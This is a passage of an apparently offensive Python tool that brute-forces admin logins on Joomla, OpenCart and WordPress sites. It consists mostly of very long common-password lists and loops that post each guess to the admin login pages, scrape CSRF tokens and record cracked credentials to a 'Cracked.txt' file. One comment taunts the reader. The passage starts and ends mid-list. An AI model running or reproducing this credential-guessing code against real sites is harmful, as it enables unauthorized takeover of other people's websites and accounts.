'dragon', 'adam', 'alpha', '888999', '11011011', 'aaaabbbb', 'barcelona', '4r3e2w1q', '789789', 'minimum', 'welkom', 'password2', 'online', '7895123', '12121212', '134679', 'chicago1', '951753', 'mike', '12345qwert', 'p455w0rd', '123321123', 'administrator1', '555555', 'computer1', 'karlita', 'oicu812', 'password!', 'myadmin', 'cantrell', 'qw12qw12', 'admin0', 'yankees1', 'drowssap', '112233445566', 'pippo', 'adidas', 'qwe123qwe', 'abc@123', 'philips', 'ecuador', 'qwe123qwe123', 'asdasd12', 'user123', 'lindsey', '1234566', 'ghjcnjgfhjkm', 'qqq111', '114466', 'romeo123', '123qaz', '2013', '1048', '0123456', 'livestrong', '12301230', 'monroe', '232323', '01020304', '13579', 'alessandro', 'change', '11112222', '12369874', 'blahblah', 'zxcv1234', '159159', '1212', '1qay2wsx', 'maradona', 'school', '131313', 'logitech', 'nikita', 'australia', 'a1s2d3', 'qwerty1', 'abc', 'esteban', 'lol123', 'qwe123123', '010101', 'letmein1', 'david', 'power', 'gallery', 'alex123', '456852', 'okinawa', 'google', 'fantom', 'mustafa', '12131415', '123456@@', 'qazwsxedc123', 'shalom', 'designer', 'amsterdam', 'surfing', 'cinema', '123456@', 'support', '1a2s3d4f', 'zxasqw12', 'satan666', '9999', '212121', 'green123', 'chocolate', '050987', '123123aa', 'burrito', 'pirate', 'qqqqqq', 'holahola', '1q2w3e4r5t6y7u', 'adminka', 'superman', 'gustav', 'antony', 'asdasdasd', 'basketball', '200808', 'asdfghjkl', 'cocacola', 'security', '147147', 'serenity', 'sasasa', 'power123', 'jasmine1', '123456987', 'creative1', 'liverpool1', 'santiago', '12345qwe', '1231', '1235', '111222333', 'password11', '171717', 'admin666', 'a1b2c3', '007007', '963852', '31415926', 'moomoo', 'hejhej123', 'jackson1', 'azsxdcfv', '1234321', 'yjdsqgfhjkm', '!@', '2112', 'p@ssword1', 'alex', '1234rewq', 'star123', 'freedom1', '1234512345', '0123456789', '456789', 'hjccbz', '1453', 'asasas', 'password12', 'admin@2014', 'gabriel', 'xxx', '12345600', '123asd', 'lalala', '0915', 'qweqweqwe', 'showtime', 'behappy', 'design', '12345678910', 'devil666', 'password99', '123321a', 'matt123', 'magicman', '121314', 'msconfig', '12345q', 'nopassword', '1z2x3c4v', 'ferrari', 'merlin123', 'q123456', '123456ab', 'q1234567', '1234554321', 'robert', 'site', 'william1', 'cantona7', '1qaz1qaz', 'orange', 'monika', 'qweqwe123', 'aaron', 'backspace', 'maximus', 'ilovejesus', 'adrian', '123654123', '16121988', 'cambiami', '123455', 'master007', '1352', 'hola', '135790', 'catcher', 'michael', 'qweasd', 'ncc1701e', 'zaq123', 'jonny123', 'mafalda', 'wordpass', '147852369', 'greengreen', '123123a', '122333', '852456', 'poiu0987', 'mathews', '192837', '12345qaz', 'bridges', '321', 'charlie1', 'maverick', 'password@123', 'thx1138', 'happy1', 'nester', '111213', '123456q', 'chester', 'adminuser', 'george1', 'qweasdzx', '753951', 'gfhjkm21', '12312', '135792468', '100200300', '1234567q', '112233aa', 'jamal', 'admin12345678', '789456123', 'killer123', 'abcdef', 'm1m2m3m4', 'qazxsw123', 'hacker', 'megamanx', 'cyber', 'baby12', 'trinity1', '12345687', 'aa112233', '11051984', 'benjamin1', 'houston1', 'carpet', 'anaconda', 'studio', '1020304050', 'open', 'zerocool', 'europa', '11235813', '444444', 'asdfghjkl;', 'polopolo', 'monkey', 'andres', 'aaaa', 'system', 'divine', '3edc4rfv', 'hakeem', 'p4ssword', '20102010', '786786', 'hawaii50', 'jennifer1', 'mercedes', 'marlboro', 'tester123', 'phoenix', 'xiaochao', '112358', '321654987', 'devil', 'elephant', 'grades', 'armani', 'hello1234', '0987654321', '1q2w3e*', 'charlie', 'nonenone', '1235123', 'test12', 'hahaha', '654123', 'qwerty12', '101010101', '000', '10071007', '15963', 'blabla', 'q2w3e4r5', 'a123456a', 'mario', 'expert', '1598753', 'qazwsx1234', 'gloria', '323232', 'john123', 'rootroot', 'hej123', 'california', 'spitfire', 'mama', 'hercules', 'ghjuhfvvf', '3216732167', 'enterprise', 'tomtom', 'secure', 'blessed1', 'fgfgfg', 'hal9000', '789456', 'akvamarin', 'hoilamgi', 'super', 'training', 'jonathan', 'martin', 'gogogo123', 'daidai', 'jessica', '1234567899', 'mypass', 'blablabla', 'pokemon', '31071997', 'istanbul', 'my2girls', 'prince', '1qw23er4', 'jermaine', '1123581321', 'graphics', '753159', 'titanic', 'aladin', 'jan', '11111', 'jackson', 'india@123', 'syracuse', 'login123', '1z2x3c', '12348765', 'maria', 'heyhey1', 'speed123', 'qwert123', 'pacific', 'enigma', 'guest', 'master11', 'asdzxc', '334455', '987987', 'leonardo', 'qaz123wsx', 'joe123', 'fandango', 'panama', 'desperado', 'freedom', 'samsung', 'starcraft', 'business', 'rush2112', 'dupa123', 'm123456789', 'badgers', '123abc123', 'solution', 'duisburg', 'joe', 'qwert', 'qwerasdf', 'gabriel1', 'personal', 'admin@1234', '19791979', '112233445566778899', 'blue123', 'webber', '1a2b3c', 'ab123456', 'password7', 'genesis', 'leandro', '1029384756', 'element', 'maxwell', 'please', 'milhouse', 'abcde12345', '12345qwerty', 'network1', '1233', 'iloveyou', 'kolobok', 'qwertyui', 'memorex', 'trigger', 'qqwwee', 'yahoo', 'penelope', '99998888', 'q', 'remember', 'jesuschrist', 'metallica', 'apples', 'qazxswedc', '100100', 'linkin', '2222', '19771977', 'fitness', 'admin123!', '898989', 'jessica1', 'esperanza', 'fatima', 'password1!', '1236987', 'andrea', 'titanic1', 'marketing', 'asd456', '123000', 'a12345678', 'superpass', 'kashmir', 'question', 'hallo', 'italia', 'scooter', '696969', 'natalie', 'catchmeifyoucan', 'pass321', '012345', 'andromeda', 'ripper', 'admin1234567', '369258', 'weare138', 'flamengo', 'agent007', '123qwer', '3333', 'gogogo', 'pass007', 'p@ssw0rd123', 'bobmarley', '456123', '19821982', 'asdf;lkj', 'fuck', '123ewq', 'qwe12345', '23232323', '12qw12qw', 'huang123', '999999999', 'chelsea1', 'norwich', 'asdfg', 'hamster', '1101', 'batman', 'mike123', '123lol123', 'felix', 'sherlock', '99887766', 'daredevil', 'toor', 'ironmaiden', 'passion', 'route66', 'tasha123', 'junior', 'liberta', 'jesus777', 'admin@123456', 'global', 'goldberg', 'goodday', '789123', 'catch22', 'london', 'kawasaki', 'favorite', '100200', '12061986', 'abrakadabra', 'dickie', '172839', 'pepper', 'thailand', 'a1a2a3a4a5', 'maximum', 'Welkom01', 'masterkey', 'prolinea', 'zxcv123', '22121987', 'metro', 'cascade', '123456..', 'jazz', 'anakin', 'ronaldo', '1qaz', 'testing1', '123456789@', 'natasha', 'netscape', '123098', 'mypassword', 'letmein22', 'aaaaaaa', 'qawsed', 'houdini', 'xxxxxx', 'whatever1', 'zxcv', 'aardvark', 'clemson', 'asdfgh01', 'victor', 'awesome1', 'compaq', 'werdna', 'password.', '424242', '123test123', '7654321', '123451', 'helmet', '123qwe123qwe', 'aaa111', '1111111111', '778899', 'evolution']
            jo_lib = requests.session()

            for admin in admins:
                for pwdjox in passwords:
                    pwdjoxz = pwdjox.strip()
                    jo_lib1 = jo_lib.get(url + '/administrator/index.php',timeout=7)

                    token = re.findall('type="hidden" name="(.*?)" value="1"', jo_lib1.content)

                    jo_logs = {'username': admin,
                               'passwd': pwdjoxz,
                               token[0]: '1',
                               'lang': 'en-GB',
                               'option': 'com_login',
                               'task': 'login',
                               'return': 'aW5kZXgucGhw'}

                    req_jo = jo_lib.post(url + '/administrator/index.php', data=jo_logs, headers=Agent,timeout=7)

                    if 'New Article' in req_jo.content:

                        jo_check = jo_lib.get(url + '/administrator/index.php?option=com_plugins',timeout=7)

                        if 'New Article' in jo_check.content:
                        	print('[Joomla] '+url+' ||'+admin+'||'+pwdjoxz+'|| \033[0;37;42mSuccess!')
                        	open('Result/Cracked.txt', 'a').write(url+'/administrator/index.php#' + admin + '#' + pwdjoxz + '\n')

                        else:
                            print('[Joomla] '+url+' ||'+admin+'||'+pwdjoxz+'|| \033[0;37;41mFailed!')
                            

                    else:
                        print('[Joomla] '+url+' ||'+admin+'||'+pwdjoxz+'|| \033[0;37;41mFailed!')
                        



        except:
            pass


    def opencart(self, url):
        try:
            cr = open('Result/Cracked.txt', 'a')
            passlist = ['admin', 'pass', '123456', 'admin123', 'admin@123', 'password', '123', '123123', '12345', 'gimboroot', '123456789', 'admin1234', 'a', '1234', 'blah', '1', 'demo', 'adminadmin', 'changeme', '12345678', 'pass123', 'p@ssw0rd', 'hello', '1q2w3e4r', 'test', 'admin!@#', '1qaz2wsx', 'test123', 'admin321', 'admin888', 'admin12345', 'admin123456', 'password123', 'q1w2e3r4', 'abc123', 'temporal', 'admin1', '123mudar', 'password1', '123qwe', 'test1234', 'majordomo', '1q2w3e4r5t', 'root', '1234567', 'welcome123', '159753', '@dm1n', 'adminpass', '111111', 'admin12', 'qwe123', '1234567890', 'abcd1234', 'condor', '1qazxsw2', 'pass12345', 'zaq12wsx', '123321', 'asdf1234', 'nimda', '123654', '12qwaszx', 'passw0rd', 'foo', 'admin!@', 'pass1234', '111', '102030', 'qwerty', '1111', 'asdasd', '1234qwer', 'freedom123', '0000', 'letmein', '88888888', 'bismillah', '1q2w3e', 'romario', 'a1b2c3d4', '02071976', 'wordpress123', 'hello123', '112233', 'wordpress', 'q1w2e3r4t5', 'admin_123', 'liverpool', 'secret', '123123123', 'password1234', 'qazwsx123', '1qaz2wsx3edc', '123450', '987654321', '123qweasd', 'q1w2e3', 'qwerty123', 'welcome', 'pa55word', 'demo123', '1qazxsw23edc', '111111a', 'temp123', '12061988', 'qazwsx', 'p4ssw0rd', '123456a', 'pa55w0rd', 'admin2', 'administrator', 'qwerty99', 'qwer1234', 'q1w2e3r4t5y6', 'qwerty12345', '123789', '!qaz@wsx', 'admin54321', 'abc12345', '000000', 'changeme123', '121212', '!', 'indonesia', 'passpass', '1234abcd', '1q2w3e4r5t6y', '00', 'lol', 'a1s2d3f4', 'webmaster', 'adm1n', 'adminadmin123', '102102102', 'letmein123', '08101979', 'testtest', 'pass@word1', 'adminadminadmin', '11223344', 'temp1234', 'admindemo', 'asdqwe123', '123698', '111111111111', '12341234', 'blog123', 'asd123', 'password12345', 'master', 'google123', '1a2b3c4d', 'qweasd123', '123qwe123', '123qweasdzxc', '12qw34er', 'wpadmin', 'parola', 'testing', 'admin!', 'pass@123', '1qa2ws3ed', 'superadmin', 'super123', 'asdasd123', 'huanhuan', 'aa123456', 'a123456', '10203040', 'qaz123', '120120', 'p@$$w0rd', 'denis123', 'f00tball', 'welkom01', 'justin', '12', 'chelsea', '147896325', '101010', '123abc', 'rootwp', 'pa$$w0rd', 'temppass', 'asd', '010203', 'p@ssword', 'success1', 'qweasdzxc', 'cougar', 'adminpassword', 'admin4321', '19861986', 'admins', 'aaaaaa', 'haha1234', '321321', 'asdf', '010173', '12312312', 'qwerty777', '@dmin', 'computer', 'default', '19831983', 'porsche911', 'admin777', 'katie123', 'welcome1', 'wolf', 'demodemo', '142536', '00000000', '090909', '666666', '159357', 'a1234567', '654321', '11111111', 'paradise', 'access123', 'digital', '87654321', 'qwerty1234', 'leo', 'a1b2c3d4e5', 'newpassword', 'qazwsxedc', 'torero', '1111111', 'formula', 'start123', '0okm9ijn', 'password01', 'teste', 'mmmmm', 'happy123', 'qweqwe', 'senha123', 'passwort', 'banana', 'rahasia', '111111q', '55555', 'azertyuiop', 'asdfasdf', '123admin', '213243', 'trustno1', 'admin123123', 'yellow5', 'aa', '11', 'bond007', '123654789', 'access', '!qazxsw2', 'india123', 'arsenal1', 'nopass', '1z2x3c4v5b', 'abc123456', '14531453', 'admin_pass', 'simsim', 'azerty123', 'creative', 'zaq1xsw2', '147258369', 'haslo123', 'temp', '1122334455', 'internet', '888888', 'wedding', 'newpass', '13579246810', 'pppppppp', 'apple123', 'tester', 'password13', '114477', '123457', '7777777', '147852', 'taekwondo', 'temporary', '123456789a', 'password01!', 'landmark', 'website', 'wordpress1', '12345670', 'p0o9i8u7', 'fuckyou2', '1234567a', '1million', 'a123456789', 'pakistan', 'jordan23', '12344321', '235689', 'volcom', 'ali123', 'jesus123', '741852963', 'deniska', 'test12345', 'manager', '1112131415', 'banana11', '151515', 'dantheman', 'blink182', '147258', 'cronos', 'zxcasdqwe123', 'apple', 'dexter', 'motdepasse', 'matrix', 'topsecret', '963963', 'blog', 'pa$$word', 'P@ssw0rd', 'xxx1234', 'root123', 'monkey123', 'maker', 'admin@321', '159951', '1qazzaq1', '1234560', 'qazxsw', '222222', 'asdf123', 'azerty', '1478963', '123456aa', 'tiger', 'mohammed', 'aaa', '252525', 'testpass', 'qqqqqqqq', 'pass1', '123qwerty', '2345', 'sandra', 'priest', 'admin21', 'kamikaze', '123stella', 'jochen', 'hack', 'abcd', 'ganteng', 'reset123', 'a12345', 'goldstar', '123456abc', 'gfhjkm', 'master12', 'qwerty123456', 'test1', 'aq1sw2de3', '1234asdf', 'qazwsx12', 'blogadmin', '202020', 'admin345', 'matthew1', 'download', 'qwert12345', '210877', 'geheim', 'money123', '123465', 'testing123', 'mercury1', 'anthony1', '071073', 'online123', 'eminem', 'user', 'hackers', '1q2w3e4r5', 'passwd', 'sunshine', 'qwertyuiop', '14789632', 'hacked', 'pass12', 'daniel', '123456123', 'xxx123', 'abcd123', 'wachtwoord', 'asdfgh', '123456qwerty', 'john316', '1313', '1q2w3e4r5t6y7u8i', 'success', 'babylon', 'vagrant', 'marino13', 'qwerty5', 'general', 'champ123', '1230', 'soccer77', 'chris123', 'nirvana', '54321', '131284', 'qwaszx', 'fox', 'diablo', '111222', 'swordfish', 'bluemoon', 'dragon', 'adam', 'alpha', '888999', '11011011', 'aaaabbbb', 'barcelona', '4r3e2w1q', '789789', 'minimum', 'welkom', 'password2', 'online', '7895123', '12121212', '134679', 'chicago1', '951753', 'mike', '12345qwert', 'p455w0rd', '123321123', 'administrator1', '555555', 'computer1', 'karlita', 'oicu812', 'password!', 'myadmin', 'cantrell', 'qw12qw12', 'admin0', 'yankees1', 'drowssap', '112233445566', 'pippo', 'adidas', 'qwe123qwe', 'abc@123', 'philips', 'ecuador', 'qwe123qwe123', 'asdasd12', 'user123', 'lindsey', '1234566', 'ghjcnjgfhjkm', 'qqq111', '114466', 'romeo123', '123qaz', '2013', '1048', '0123456', 'livestrong', '12301230', 'monroe', '232323', '01020304', '13579', 'alessandro', 'change', '11112222', '12369874', 'blahblah', 'zxcv1234', '159159', '1212', '1qay2wsx', 'maradona', 'school', '131313', 'logitech', 'nikita', 'australia', 'a1s2d3', 'qwerty1', 'abc', 'esteban', 'lol123', 'qwe123123', '010101', 'letmein1', 'david', 'power', 'gallery', 'alex123', '456852', 'okinawa', 'google', 'fantom', 'mustafa', '12131415', '123456@@', 'qazwsxedc123', 'shalom', 'designer', 'amsterdam', 'surfing', 'cinema', '123456@', 'support', '1a2s3d4f', 'zxasqw12', 'satan666', '9999', '212121', 'green123', 'chocolate', '050987', '123123aa', 'burrito', 'pirate', 'qqqqqq', 'holahola', '1q2w3e4r5t6y7u', 'adminka', 'superman', 'gustav', 'antony', 'asdasdasd', 'basketball', '200808', 'asdfghjkl', 'cocacola', 'security', '147147', 'serenity', 'sasasa', 'power123', 'jasmine1', '123456987', 'creative1', 'liverpool1', 'santiago', '12345qwe', '1231', '1235', '111222333', 'password11', '171717', 'admin666', 'a1b2c3', '007007', '963852', '31415926', 'moomoo', 'hejhej123', 'jackson1', 'azsxdcfv', '1234321', 'yjdsqgfhjkm', '!@', '2112', 'p@ssword1', 'alex', '1234rewq', 'star123', 'freedom1', '1234512345', '0123456789', '456789', 'hjccbz', '1453', 'asasas', 'password12', 'admin@2014', 'gabriel', 'xxx', '12345600', '123asd', 'lalala', '0915', 'qweqweqwe', 'showtime', 'behappy', 'design', '12345678910', 'devil666', 'password99', '123321a', 'matt123', 'magicman', '121314', 'msconfig', '12345q', 'nopassword', '1z2x3c4v', 'ferrari', 'merlin123', 'q123456', '123456ab', 'q1234567', '1234554321', 'robert', 'site', 'william1', 'cantona7', '1qaz1qaz', 'orange', 'monika', 'qweqwe123', 'aaron', 'backspace', 'maximus', 'ilovejesus', 'adrian', '123654123', '16121988', 'cambiami', '123455', 'master007', '1352', 'hola', '135790', 'catcher', 'michael', 'qweasd', 'ncc1701e', 'zaq123', 'jonny123', 'mafalda', 'wordpass', '147852369', 'greengreen', '123123a', '122333', '852456', 'poiu0987', 'mathews', '192837', '12345qaz', 'bridges', '321', 'charlie1', 'maverick', 'password@123', 'thx1138', 'happy1', 'nester', '111213', '123456q', 'chester', 'adminuser', 'george1', 'qweasdzx', '753951', 'gfhjkm21', '12312', '135792468', '100200300', '1234567q', '112233aa', 'jamal', 'admin12345678', '789456123', 'killer123', 'abcdef', 'm1m2m3m4', 'qazxsw123', 'hacker', 'megamanx', 'cyber', 'baby12', 'trinity1', '12345687', 'aa112233', '11051984', 'benjamin1', 'houston1', 'carpet', 'anaconda', 'studio', '1020304050', 'open', 'zerocool', 'europa', '11235813', '444444', 'asdfghjkl;', 'polopolo', 'monkey', 'andres', 'aaaa', 'system', 'divine', '3edc4rfv', 'hakeem', 'p4ssword', '20102010', '786786', 'hawaii50', 'jennifer1', 'mercedes', 'marlboro', 'tester123', 'phoenix', 'xiaochao', '112358', '321654987', 'devil', 'elephant', 'grades', 'armani', 'hello1234', '0987654321', '1q2w3e*', 'charlie', 'nonenone', '1235123', 'test12', 'hahaha', '654123', 'qwerty12', '101010101', '000', '10071007', '15963', 'blabla', 'q2w3e4r5', 'a123456a', 'mario', 'expert', '1598753', 'qazwsx1234', 'gloria', '323232', 'john123', 'rootroot', 'hej123', 'california', 'spitfire', 'mama', 'hercules', 'ghjuhfvvf', '3216732167', 'enterprise', 'tomtom', 'secure', 'blessed1', 'fgfgfg', 'hal9000', '789456', 'akvamarin', 'hoilamgi', 'super', 'training', 'jonathan', 'martin', 'gogogo123', 'daidai', 'jessica', '1234567899', 'mypass', 'blablabla', 'pokemon', '31071997', 'istanbul', 'my2girls', 'prince', '1qw23er4', 'jermaine', '1123581321', 'graphics', '753159', 'titanic', 'aladin', 'jan', '11111', 'jackson', 'india@123', 'syracuse', 'login123', '1z2x3c', '12348765', 'maria', 'heyhey1', 'speed123', 'qwert123', 'pacific', 'enigma', 'guest', 'master11', 'asdzxc', '334455', '987987', 'leonardo', 'qaz123wsx', 'joe123', 'fandango', 'panama', 'desperado', 'freedom', 'samsung', 'starcraft', 'business', 'rush2112', 'dupa123', 'm123456789', 'badgers', '123abc123', 'solution', 'duisburg', 'joe', 'qwert', 'qwerasdf', 'gabriel1', 'personal', 'admin@1234', '19791979', '112233445566778899', 'blue123', 'webber', '1a2b3c', 'ab123456', 'password7', 'genesis', 'leandro', '1029384756', 'element', 'maxwell', 'please', 'milhouse', 'abcde12345', '12345qwerty', 'network1', '1233', 'iloveyou', 'kolobok', 'qwertyui', 'memorex', 'trigger', 'qqwwee', 'yahoo', 'penelope', '99998888', 'q', 'remember', 'jesuschrist', 'metallica', 'apples', 'qazxswedc', '100100', 'linkin', '2222', '19771977', 'fitness', 'admin123!', '898989', 'jessica1', 'esperanza', 'fatima', 'password1!', '1236987', 'andrea', 'titanic1', 'marketing', 'asd456', '123000', 'a12345678', 'superpass', 'kashmir', 'question', 'hallo', 'italia', 'scooter', '696969', 'natalie', 'catchmeifyoucan', 'pass321', '012345', 'andromeda', 'ripper', 'admin1234567', '369258', 'weare138', 'flamengo', 'agent007', '123qwer', '3333', 'gogogo', 'pass007', 'p@ssw0rd123', 'bobmarley', '456123', '19821982', 'asdf;lkj', 'fuck', '123ewq', 'qwe12345', '23232323', '12qw12qw', 'huang123', '999999999', 'chelsea1', 'norwich', 'asdfg', 'hamster', '1101', 'batman', 'mike123', '123lol123', 'felix', 'sherlock', '99887766', 'daredevil', 'toor', 'ironmaiden', 'passion', 'route66', 'tasha123', 'junior', 'liberta', 'jesus777', 'admin@123456', 'global', 'goldberg', 'goodday', '789123', 'catch22', 'london', 'kawasaki', 'favorite', '100200', '12061986', 'abrakadabra', 'dickie', '172839', 'pepper', 'thailand', 'a1a2a3a4a5', 'maximum', 'Welkom01', 'masterkey', 'prolinea', 'zxcv123', '22121987', 'metro', 'cascade', '123456..', 'jazz', 'anakin', 'ronaldo', '1qaz', 'testing1', '123456789@', 'natasha', 'netscape', '123098', 'mypassword', 'letmein22', 'aaaaaaa', 'qawsed', 'houdini', 'xxxxxx', 'whatever1', 'zxcv', 'aardvark', 'clemson', 'asdfgh01', 'victor', 'awesome1', 'compaq', 'werdna', 'password.', '424242', '123test123', '7654321', '123451', 'helmet', '123qwe123qwe', 'aaa111', '1111111111', '778899', 'evolution']
            for passwordx in passlist:
                passwd = passwordx.strip()
                # print passwd
                cookies = {
                    'OCSESSID': '41793cc49288925a72df1b7b5c',
                    'language': 'en-gb',
                    'currency': 'IDR',
                }

                data = {
                    'username': 'admin',
                    'password': passwd
                }
                r = requests.get(url + "/admin/index.php",timeout=7)
                if "https://" in r.url:
                    url = url.replace("http://", "https://")
                else:
                    pass
                s = requests.Session()
                r = s.post(url + '/admin/index.php', cookies=cookies, data=data,timeout=7)

                if 'common/logout' in r.text:
                	print('[OpenCart] '+url+' ||admin||'+passwd+'|| \033[0;37;42mSuccess!')
                	with open('Result/Cracked.txt', 'a') as cr:
                		cr.write(url+'/admin/index.php#admin'+'#'+passwd+'\n')
                	break
                else:
                    print('[OpenCart] '+url+' ||admin||'+passwd+'|| \033[0;37;41mFailed!')
                    
        except:
        	pass

    #add timeout , if you raeding this i just want to say hello , hope you are fine , and go to hell ,
    def wpbrute(self, url):
        try:
            user = "admin"
            passlist = ['admin', 'pass', '123456', 'admin123', 'admin@123', 'password', '123', '123123', '12345', 'gimboroot', '123456789', 'admin1234', 'a', '1234', 'blah', '1', 'demo', 'adminadmin', 'changeme', '12345678', 'pass123', 'p@ssw0rd', 'hello', '1q2w3e4r', 'test', 'admin!@#', '1qaz2wsx', 'test123', 'admin321', 'admin888', 'admin12345', 'admin123456', 'password123', 'q1w2e3r4', 'abc123', 'temporal', 'admin1', '123mudar', 'password1', '123qwe', 'test1234', 'majordomo', '1q2w3e4r5t', 'root', '1234567', 'welcome123', '159753', '@dm1n', 'adminpass', '111111', 'admin12', 'qwe123', '1234567890', 'abcd1234', 'condor', '1qazxsw2', 'pass12345', 'zaq12wsx', '123321', 'asdf1234', 'nimda', '123654', '12qwaszx', 'passw0rd', 'foo', 'admin!@', 'pass1234', '111', '102030', 'qwerty', '1111', 'asdasd', '1234qwer', 'freedom123', '0000', 'letmein', '88888888', 'bismillah', '1q2w3e', 'romario', 'a1b2c3d4', '02071976', 'wordpress123', 'hello123', '112233', 'wordpress', 'q1w2e3r4t5', 'admin_123', 'liverpool', 'secret', '123123123', 'password1234', 'qazwsx123', '1qaz2wsx3edc', '123450', '987654321', '123qweasd', 'q1w2e3', 'qwerty123', 'welcome', 'pa55word', 'demo123', '1qazxsw23edc', '111111a', 'temp123', '12061988', 'qazwsx', 'p4ssw0rd', '123456a', 'pa55w0rd', 'admin2', 'administrator', 'qwerty99', 'qwer1234', 'q1w2e3r4t5y6', 'qwerty12345', '123789', '!qaz@wsx', 'admin54321', 'abc12345', '000000', 'changeme123', '121212', '!', 'indonesia', 'passpass', '1234abcd', '1q2w3e4r5t6y', '00', 'lol', 'a1s2d3f4', 'webmaster', 'adm1n', 'adminadmin123', '102102102', 'letmein123', '08101979', 'testtest', 'pass@word1', 'adminadminadmin', '11223344', 'temp1234', 'admindemo', 'asdqwe123', '123698', '111111111111', '12341234', 'blog123', 'asd123', 'password12345', 'master', 'google123', '1a2b3c4d', 'qweasd123', '123qwe123', '123qweasdzxc', '12qw34er', 'wpadmin', 'parola', 'testing', 'admin!', 'pass@123', '1qa2ws3ed', 'superadmin', 'super123', 'asdasd123', 'huanhuan', 'aa123456', 'a123456', '10203040', 'qaz123', '120120', 'p@$$w0rd', 'denis123', 'f00tball', 'welkom01', 'justin', '12', 'chelsea', '147896325', '101010', '123abc', 'rootwp', 'pa$$w0rd', 'temppass', 'asd', '010203', 'p@ssword', 'success1', 'qweasdzxc', 'cougar', 'adminpassword', 'admin4321', '19861986', 'admins', 'aaaaaa', 'haha1234', '321321', 'asdf', '010173', '12312312', 'qwerty777', '@dmin', 'computer', 'default', '19831983', 'porsche911', 'admin777', 'katie123', 'welcome1', 'wolf', 'demodemo', '142536', '00000000', '090909', '666666', '159357', 'a1234567', '654321', '11111111', 'paradise', 'access123', 'digital', '87654321', 'qwerty1234', 'leo', 'a1b2c3d4e5', 'newpassword', 'qazwsxedc', 'torero', '1111111', 'formula', 'start123', '0okm9ijn', 'password01', 'teste', 'mmmmm', 'happy123', 'qweqwe', 'senha123', 'passwort', 'banana', 'rahasia', '111111q', '55555', 'azertyuiop', 'asdfasdf', '123admin', '213243', 'trustno1', 'admin123123', 'yellow5', 'aa', '11', 'bond007', '123654789', 'access', '!qazxsw2', 'india123', 'arsenal1', 'nopass', '1z2x3c4v5b', 'abc123456', '14531453', 'admin_pass', 'simsim', 'azerty123', 'creative', 'zaq1xsw2', '147258369', 'haslo123', 'temp', '1122334455', 'internet', '888888', 'wedding', 'newpass', '13579246810', 'pppppppp', 'apple123', 'tester', 'password13', '114477', '123457', '7777777', '147852', 'taekwondo', 'temporary', '123456789a', 'password01!', 'landmark', 'website', 'wordpress1', '12345670', 'p0o9i8u7', 'fuckyou2', '1234567a', '1million', 'a123456789', 'pakistan', 'jordan23', '12344321', '235689', 'volcom', 'ali123', 'jesus123', '741852963', 'deniska', 'test12345', 'manager', '1112131415', 'banana11', '151515', 'dantheman', 'blink182', '147258', 'cronos', 'zxcasdqwe123', 'apple', 'dexter', 'motdepasse', 'matrix', 'topsecret', '963963', 'blog', 'pa$$word', 'P@ssw0rd', 'xxx1234', 'root123', 'monkey123', 'maker', 'admin@321', '159951', '1qazzaq1', '1234560', 'qazxsw', '222222', 'asdf123', 'azerty', '1478963', '123456aa', 'tiger', 'mohammed', 'aaa', '252525', 'testpass', 'qqqqqqqq', 'pass1', '123qwerty', '2345', 'sandra', 'priest', 'admin21', 'kamikaze', '123stella', 'jochen', 'hack', 'abcd', 'ganteng', 'reset123', 'a12345', 'goldstar', '123456abc', 'gfhjkm', 'master12', 'qwerty123456', 'test1', 'aq1sw2de3', '1234asdf', 'qazwsx12', 'blogadmin', '202020', 'admin345', 'matthew1', 'download', 'qwert12345', '210877', 'geheim', 'money123', '123465', 'testing123', 'mercury1', 'anthony1', '071073', 'online123', 'eminem', 'user', 'hackers', '1q2w3e4r5', 'passwd', 'sunshine', 'qwertyuiop', '14789632', 'hacked', 'pass12', 'daniel', '123456123', 'xxx123', 'abcd123', 'wachtwoord', 'asdfgh', '123456qwerty', 'john316', '1313', '1q2w3e4r5t6y7u8i', 'success', 'babylon', 'vagrant', 'marino13', 'qwerty5', 'general', 'champ123', '1230', 'soccer77', 'chris123', 'nirvana', '54321', '131284', 'qwaszx', 'fox', 'diablo', '111222', 'swordfish', 'bluemoon', 'dragon', 'adam', 'alpha', '888999', '11011011', 'aaaabbbb', 'barcelona', '4r3e2w1q', '789789', 'minimum', 'welkom', 'password2', 'online', '7895123', '12121212', '134679', 'chicago1', '951753', 'mike', '12345qwert', 'p455w0rd', '123321123', 'administrator1', '555555', 'computer1', 'karlita', 'oicu812', 'password!', 'myadmin', 'cantrell', 'qw12qw12', 'admin0', 'yankees1', 'drowssap', '112233445566', 'pippo', 'adidas', 'qwe123qwe', 'abc@123', 'philips', 'ecuador', 'qwe123qwe123', 'asdasd12', 'user123', 'lindsey', '1234566', 'ghjcnjgfhjkm', 'qqq111', '114466', 'romeo123', '123qaz', '2013', '1048', '0123456', 'livestrong', '12301230', 'monroe', '232323', '01020304', '13579', 'alessandro', 'change', '11112222', '12369874', 'blahblah', 'zxcv1234', '159159', '1212', '1qay2wsx', 'maradona', 'school', '131313', 'logitech', 'nikita', 'australia', 'a1s2d3', 'qwerty1', 'abc', 'esteban', 'lol123', 'qwe123123', '010101', 'letmein1', 'david', 'power', 'gallery', 'alex123', '456852', 'okinawa', 'google', 'fantom', 'mustafa', '12131415', '123456@@', 'qazwsxedc123', 'shalom', 'designer', 'amsterdam', 'surfing', 'cinema', '123456@', 'support', '1a2s3d4f', 'zxasqw12', 'satan666', '9999', '212121', 'green123', 'chocolate', '050987', '123123aa', 'burrito', 'pirate', 'qqqqqq', 'holahola', '1q2w3e4r5t6y7u', 'adminka', 'superman', 'gustav', 'antony', 'asdasdasd', 'basketball', '200808', 'asdfghjkl', 'cocacola', 'security', '147147', 'serenity', 'sasasa', 'power123', 'jasmine1', '123456987', 'creative1', 'liverpool1', 'santiago', '12345qwe', '1231', '1235', '111222333', 'password11', '171717', 'admin666', 'a1b2c3', '007007', '963852', '31415926', 'moomoo', 'hejhej123', 'jackson1', 'azsxdcfv', '1234321', 'yjdsqgfhjkm', '!@', '2112', 'p@ssword1', 'alex', '1234rewq', 'star123', 'freedom1', '1234512345', '0123456789', '456789', 'hjccbz', '1453', 'asasas', 'password12', 'admin@2014', 'gabriel', 'xxx', '12345600', '123asd', 'lalala', '0915', 'qweqweqwe', 'showtime', 'behappy', 'design', '12345678910', 'devil666', 'password99', '123321a', 'matt123', 'magicman', '121314', 'msconfig', '12345q', 'nopassword', '1z2x3c4v', 'ferrari', 'merlin123', 'q123456', '123456ab', 'q1234567', '1234554321', 'robert', 'site', 'william1', 'cantona7', '1qaz1qaz', 'orange', 'monika', 'qweqwe123', 'aaron', 'backspace', 'maximus', 'ilovejesus', 'adrian', '123654123', '16121988', 'cambiami', '123455', 'master007', '1352', 'hola', '135790', 'catcher', 'michael', 'qweasd', 'ncc1701e', 